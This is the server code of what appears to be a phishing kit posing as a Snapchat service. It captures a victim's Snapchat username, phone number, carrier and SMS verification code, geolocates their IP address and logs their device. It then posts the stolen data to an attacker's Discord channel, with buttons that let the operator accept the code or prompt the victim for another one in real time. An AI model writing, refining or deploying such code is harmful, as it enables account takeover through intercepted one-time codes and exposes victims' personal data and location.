import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const DISCORD_BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
const DISCORD_CHANNEL_ID = Deno.env.get("DISCORD_CHANNEL_ID");

Deno.serve(async (req) => {
  const base44 = createClientFromRequest(req);
  const { snapchat, telephone, operateur, code, submissionId } = await req.json();

  const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
  const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);

  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
  const userAgent = req.headers.get("user-agent") || "";
  
  let browser = "Inconnu";
  let device = "Inconnu";
  
  if (userAgent.includes("Chrome")) browser = "Chrome";
  else if (userAgent.includes("Safari")) browser = "Safari";
  else if (userAgent.includes("Firefox")) browser = "Firefox";
  else if (userAgent.includes("Edge")) browser = "Edge";
  
  if (userAgent.includes("Mobile") || userAgent.includes("Android")) device = "📱 Téléphone";
  else if (userAgent.includes("iPad")) device = "📱 Tablette";
  else device = "💻 PC";
  
  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";

  // These links call triggerSendCode with the action param
  const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
  const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;

  // Create a simple blacklist URL with base64 encoding
  const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
  const blacklistUrl = `${appUrl}/api/blacklist?data=${blacklistPayload}`;

  let country = "Inconnue";
  let city = "Inconnue";
  try {
    const geoRes = await fetch(`https://geolocation-db.com/json/${ip}`, { signal: AbortSignal.timeout(5000) });
    if (geoRes.ok) {
      const geo = await geoRes.json();
      country = geo.country_name || "Inconnue";
      city = geo.city || "Inconnue";
    }
  } catch (e) {
    console.error("geolocation-db failed:", e.message);
    try {
      const geoRes = await fetch(`https://ip-api.com/json/${ip}`, { signal: AbortSignal.timeout(5000) });
      if (geoRes.ok) {
        const altData = await geoRes.json();
        if (altData.status === "success") {
          country = altData.country || "Inconnue";
          city = altData.city || "Inconnue";
        }
      }
    } catch (e2) {
      console.error("ip-api.com failed:", e2.message);
    }
  }

  const embed = {
    title: "🔑 Code SMS entré",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
      { name: "📡 Opérateur", value: operateur, inline: true },
      { name: "📞 Numéro", value: formatPhone(telephone), inline: true },
      { name: "🔢 Code entré", value: `**${code}**`, inline: true },
      { name: "🌍 Pays", value: country, inline: true },
      { name: "🏙️ Ville", value: city, inline: true },
      { name: "🌐 Navigateur", value: browser, inline: true },
      { name: "💾 Appareil", value: device, inline: true },
      { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
      { name: "🕐 Date de soumission", value: dateStr, inline: false },
      {
        name: "Actions",
        value: `✅ [**Valider le code**](${validUrl})\n❌ [**Changer le numéro**](${wrongUrl})\n⏰ [**Renvoyer au code**](${expiredUrl})\n🚫 [**Instant Blacklist**](${blacklistUrl})`,
        inline: false
      },
    ],
    footer: { text: `ID: ${submissionId || "N/A"}` },
    timestamp: now.toISOString(),
  };

  await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bot ${DISCORD_BOT_TOKEN}`
    },
    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
  });

  return Response.json({ ok: true });
});